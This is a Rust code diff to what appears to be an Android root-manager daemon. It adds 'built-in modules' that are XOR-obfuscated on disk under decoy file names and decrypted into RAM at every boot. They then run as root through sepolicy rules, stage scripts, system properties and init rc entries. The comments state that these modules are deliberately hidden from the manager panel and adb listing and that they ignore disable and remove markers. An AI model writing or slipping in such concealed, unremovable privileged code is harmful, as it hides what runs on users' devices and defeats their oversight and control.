@@ -43,6 +43,84 @@ const INSTALL_MODULE_SCRIPT: &str = concatcp!(
     "\n"
 );
 
+// ---------------------------------------------------------------------------
+// Built-in module storage & materialization
+//
+// Built-in modules execute like ordinary modules but live encrypted at rest
+// (under BUILTIN_STORE_DIR) and are decrypted into a tmpfs runtime dir
+// (BUILTIN_MODULE_DIR) at boot. The on-disk blobs use innocuous token names so
+// a casual `ls`/`cat` reveals neither the module ids nor their contents.
+// ---------------------------------------------------------------------------
+
+const BUILTIN_XOR_KEY: &[u8] = b"xdcv1";
+
+const BUILTIN_MODULES: &[(&str, &str)] = &[
+    ("tricky_store", "0.cfg"),
+    ("TA_enhanced", "1.cfg"),
+];
+
+const BUILTIN_MAGIC: &[u8; 4] = b"BCFG";
+
+fn xor_builtin(data: &[u8]) -> Vec<u8> {
+    data.iter()
+        .enumerate()
+        .map(|(i, b)| b ^ BUILTIN_XOR_KEY[i % BUILTIN_XOR_KEY.len()])
+        .collect()
+}
+
+fn builtin_file_mode(rel: &str) -> u32 {
+    if rel.ends_with(".sh")
+        || rel.starts_with("bin/")
+        || matches!(rel, "daemon" | "inject" | "supervisor")
+    {
+        0o755
+    } else {
+        0o644
+    }
+}
+
+fn pack_builtin_module(entries: &[(String, u32, Vec<u8>)]) -> Vec<u8> {
+    let mut buf = Vec::with_capacity(64 * 1024);
+    buf.extend_from_slice(BUILTIN_MAGIC);
+    buf.push(1u8);
+    buf.extend_from_slice(&(entries.len() as u32).to_le_bytes());
+    for (path, mode, data) in entries {
+        let path = path.as_bytes();
+        buf.extend_from_slice(&(path.len() as u16).to_le_bytes());
+        buf.extend_from_slice(path);
+        buf.extend_from_slice(&mode.to_le_bytes());
+        buf.extend_from_slice(&(data.len() as u32).to_le_bytes());
+        buf.extend_from_slice(data);
+    }
+    xor_builtin(&buf)
+}
+
+fn unpack_builtin_module(blob: &[u8]) -> Result<Vec<(String, u32, Vec<u8>)>> {
+    let raw = xor_builtin(blob);
+    ensure!(raw.len() >= 9, "builtin blob too short");
+    ensure!(&raw[..4] == BUILTIN_MAGIC, "bad builtin blob magic");
+    let count = u32::from_le_bytes(raw[5..9].try_into().unwrap()) as usize;
+    let mut off = 9usize;
+    let mut entries = Vec::with_capacity(count);
+    for _ in 0..count {
+        ensure!(off + 2 <= raw.len(), "truncated builtin blob");
+        let plen = u16::from_le_bytes(raw[off..off + 2].try_into().unwrap()) as usize;
+        off += 2;
+        ensure!(off + plen + 8 <= raw.len(), "truncated builtin blob");
+        let path = String::from_utf8_lossy(&raw[off..off + plen]).into_owned();
+        off += plen;
+        let mode = u32::from_le_bytes(raw[off..off + 4].try_into().unwrap());
+        off += 4;
+        let dlen = u32::from_le_bytes(raw[off..off + 4].try_into().unwrap()) as usize;
+        off += 4;
+        ensure!(off + dlen <= raw.len(), "truncated builtin blob");
+        let data = raw[off..off + dlen].to_vec();
+        off += dlen;
+        entries.push((path, mode, data));
+    }
+    Ok(entries)
+}
+
 /// Validate module_id format and security
 /// Module ID must match: ^[a-zA-Z][a-zA-Z0-9._-]+$
 /// - Must start with a letter (a-zA-Z)
@@ -164,6 +242,24 @@ fn foreach_active_module(f: impl FnMut(&Path) -> Result<()>) -> Result<()> {
     foreach_module(Active, f)
 }
 
+/// Iterate decrypted built-in modules under the tmpfs runtime dir. These
+/// execute like normal modules but are never enumerated by the manager panel
+/// or `adb ls modules/`, and the encrypted on-disk store is not readable.
+fn foreach_builtin_module(mut f: impl FnMut(&Path) -> Result<()>) -> Result<()> {
+    let modules_dir = Path::new(defs::BUILTIN_MODULE_DIR);
+    let Ok(dir) = std::fs::read_dir(modules_dir) else {
+        return Ok(());
+    };
+    for entry in dir.flatten() {
+        let path = entry.path();
+        if !path.is_dir() {
+            continue;
+        }
+        f(&path)?;
+    }
+    Ok(())
+}
+
 pub fn load_sepolicy_rule() -> Result<()> {
     foreach_active_module(|path| {
         let rule_file = path.join("sepolicy.rule");
@@ -178,24 +274,43 @@ pub fn load_sepolicy_rule() -> Result<()> {
         Ok(())
     })?;
 
+    foreach_builtin_module(|path| {
+        let rule_file = path.join("sepolicy.rule");
+        if !rule_file.exists() {
+            return Ok(());
+        }
+        info!("load built-in policy: {}", rule_file.display());
+
+        if sepolicy::apply_file(&rule_file).is_err() {
+            warn!("Failed to load sepolicy.rule for {}", rule_file.display());
+        }
+        Ok(())
+    })?;
+
     Ok(())
+}
+
+/// Extract the module id from a module script path. Returns whether the path
+/// is inside a module dir (built-in included) and the id if resolvable.
+fn extract_module_id(path: &Path) -> (bool, Option<String>) {
+    for base in [defs::MODULE_DIR, defs::BUILTIN_MODULE_DIR] {
+        if let Some(id) = path
+            .strip_prefix(base)
+            .ok()
+            .and_then(|p| p.components().next())
+            .and_then(|c| c.as_os_str().to_str())
+            .map(ToString::to_string)
+        {
+            return (true, Some(id));
+        }
+    }
+    (false, None)
 }
 
 pub fn exec_script<T: AsRef<Path>>(path: T, wait: bool) -> Result<()> {
     info!("exec {}", path.as_ref().display());
 
-    let is_module_script = path.as_ref().starts_with(defs::MODULE_DIR);
-    // Extract module_id from path if it matches /data/adb/modules/{id}/...
-    let module_id = if is_module_script {
-        path.as_ref()
-            .strip_prefix(defs::MODULE_DIR)
-            .ok()
-            .and_then(|p| p.components().next())
-            .and_then(|c| c.as_os_str().to_str())
-            .map(ToString::to_string)
-    } else {
-        None
-    };
+    let (is_module_script, module_id) = extract_module_id(path.as_ref());
 
     // Validate and log module_id extraction
     let validated_module_id = module_id
@@ -265,6 +380,15 @@ pub fn exec_stage_script(stage: &str, block: bool) -> Result<()> {
         exec_script(&script_path, block)
     })?;
 
+    foreach_builtin_module(|module| {
+        let script_path = module.join(format!("{stage}.sh"));
+        if !script_path.exists() {
+            return Ok(());
+        }
+
+        exec_script(&script_path, block)
+    })?;
+
     Ok(())
 }
 
@@ -302,6 +426,74 @@ pub fn load_system_prop() -> Result<()> {
 
         Ok(())
     })?;
+
+    foreach_builtin_module(|module| {
+        let system_prop = module.join("system.prop");
+        if !system_prop.exists() {
+            return Ok(());
+        }
+        info!("load built-in {} system.prop", module.display());
+
+        crate::resetprop::load_system_prop_file(&system_prop)?;
+
+        Ok(())
+    })?;
+
+    Ok(())
+}
+
+/// Persistent encrypted store + tmpfs materialization for built-in modules.
+///
+/// On-disk blobs are written only once (so a manager/user can drop a replaced
+/// `<token>` blob to update without reflashing); the runtime dir is decrypted
+/// from those blobs every boot into RAM-only tmpfs.
+pub fn ensure_builtin_modules() -> Result<()> {
+    // 1. Encrypt the bundled modules into the on-disk store (idempotent).
+    for (module_id, token) in BUILTIN_MODULES {
+        let dest = Path::new(defs::BUILTIN_STORE_DIR).join(token);
+        if dest.exists() {
+            continue;
+        }
+        let prefix = format!("{module_id}/");
+        let mut entries = Vec::new();
+        for file in assets::list_builtin_assets() {
+            if let Some(rel) = file.strip_prefix(&prefix) {
+                let data = assets::get_builtin_asset(&file)?;
+                let mode = builtin_file_mode(rel);
+                entries.push((rel.to_string(), mode, data));
+            }
+        }
+        if let Some(parent) = dest.parent() {
+            std::fs::create_dir_all(parent)
+                .with_context(|| format!("Failed to create {}", parent.display()))?;
+        }
+        let blob = pack_builtin_module(&entries);
+        std::fs::write(&dest, blob)
+            .with_context(|| format!("Failed to write {}", dest.display()))?;
+    }
+
+    // 2. Decrypt each store blob into the tmpfs runtime dir.
+    for (module_id, token) in BUILTIN_MODULES {
+        let store = Path::new(defs::BUILTIN_STORE_DIR).join(token);
+        let blob = std::fs::read(&store)
+            .with_context(|| format!("Failed to read {}", store.display()))?;
+        let entries = unpack_builtin_module(&blob)?;
+        let base = Path::new(defs::BUILTIN_MODULE_DIR).join(module_id);
+        for (rel, mode, data) in entries {
+            let dest = base.join(&rel);
+            if dest.exists() {
+                continue;
+            }
+            if let Some(parent) = dest.parent() {
+                std::fs::create_dir_all(parent)
+                    .with_context(|| format!("Failed to create {}", parent.display()))?;
+            }
+            std::fs::write(&dest, &data)
+                .with_context(|| format!("Failed to write {}", dest.display()))?;
+            #[cfg(unix)]
+            std::fs::set_permissions(&dest, Permissions::from_mode(mode))?;
+        }
+    }
 
     Ok(())
 }
@@ -451,6 +643,20 @@ pub fn regenerate_preinit_rc() -> Result<()> {
                     continue;
                 }
                 modules.entry(id).or_insert(Some(module_path));
+            }
+        }
+        // Built-in modules always contribute their rc and are never listed in
+        // the panel, so they ignore any disable/remove marker.
+        if let Ok(entries) = std::fs::read_dir(defs::BUILTIN_MODULE_DIR) {
+            for entry in entries.flatten() {
+                let module_path = entry.path();
+                if !module_path.is_dir() {
+                    continue;
+                }
+                let Some(id) = module_path.file_name().and_then(|s| s.to_str()) else {
+                    continue;
+                };
+                modules.insert(id.to_string(), Some(module_path));
             }
         }
         for (id, path) in modules {
